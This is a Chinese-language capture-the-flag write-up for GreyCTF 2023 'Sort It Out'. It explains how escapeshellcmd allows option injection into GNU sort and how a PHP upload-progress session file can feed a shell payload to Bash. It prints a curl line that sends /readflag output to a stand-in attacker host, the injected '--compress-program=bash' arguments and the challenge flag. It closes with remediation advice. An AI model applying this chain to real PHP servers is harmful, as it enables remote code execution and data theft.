# GreyCTF 2023 Sort It Out

## 题目简述

页面把用户指定的文件交给多种排序实现计时，其中 GNU `sort` 通过 `exec("sort " . escapeshellcmd($filename))` 调用。`escapeshellcmd` 会转义部分元字符，却不会把整个文件名作为单一参数引用，因此仍可注入 `sort` 选项。结合 PHP 上传进度会话文件，可以让 GNU `sort` 把攻击者控制的内容交给 Bash 执行。

## 解题过程

第一步固定 `PHPSESSID`，发起一个带 `PHP_SESSION_UPLOAD_PROGRESS` 字段和大文件的 multipart 上传。上传尚未完成时，PHP 会在 `/tmp/sess_<session-id>` 中保存进度；进度字段可把 shell 语句嵌进会话键名。概念载荷如下：

```text
PHP_SESSION_UPLOAD_PROGRESS = & curl ATTACKER/?flag=$(/readflag) && x\nx
```

保持上传连接未完成，使会话文件暂时存在。随后向排序页面提交：

```text
/tmp/sess_loldongs -S 10b --compress-program=bash
```

拼接后的命令等价于：

```bash
sort /tmp/sess_loldongs -S 10b --compress-program=bash
```

空格没有被 `escapeshellcmd` 包住，所以 `-S 10b` 和 `--compress-program=bash` 被解释为独立选项。极小的内存上限迫使 `sort` 生成临时归并块，并调用 Bash 作为所谓压缩程序；会话文件中的攻击者文本经排序流程进入 Bash，从而执行 `/readflag` 并把结果送到自有接收端：

```text
grey{It_w4s_No7_a_gO0D_DAy}
```

## 方法总结

`escapeshellcmd` 只面向整条命令的元字符，并不能防止参数注入。若确实需要调用外部程序，应固定允许的文件列表，并对单个参数使用 `escapeshellarg` 或不经 shell 的参数数组接口。同时应关闭不需要的 PHP 上传进度功能，并避免让临时会话内容进入可由用户控制参数的命令链。
